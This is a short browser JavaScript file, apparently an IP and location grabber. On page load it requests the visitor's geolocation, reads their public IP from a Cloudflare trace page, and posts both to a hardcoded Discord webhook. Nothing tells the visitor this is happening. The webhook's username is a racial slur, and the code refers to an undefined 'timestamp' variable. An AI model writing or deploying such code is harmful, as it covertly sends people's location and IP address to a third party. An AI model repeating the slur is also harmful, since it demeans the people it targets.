console.log("HI")
function text(url) {
  console.log(url)
  return fetch(url).then(res => res.text());
}
function sendMessage(msg) {
  const request = new XMLHttpRequest();
  request.open("POST", "https://discord.com/api/webhooks/1105995807066427392/f2bAUihbaCF68cSjC_zWbgYY_MdZIm9FyvfVpCa47F6OLC1Qc7gC9sOq_91XIfCkSc-U");
  request.setRequestHeader('Content-type', 'application/json');

  const params = {
    username: "Niggaheimer",
    avatar_url: "",
    content: msg
  }

  request.send(JSON.stringify(params));
}

var x = document.getElementById("demo");
function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition);
  } else {
    x.innerHTML = "Geolocation is not supported by this browser.";
  }
}
spc = " "
function showPosition(position) {
  text('https://www.cloudflare.com/cdn-cgi/trace').then(data => {
  let ipRegex = /[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}/
  let ip = data.match(ipRegex)[0];
  console.log(ip);
  sendMessage(ip+spc+position.coords.longitude+spc+position.coords.latitude+spc+timestamp);
});
  console.log(position)
}

getLocation()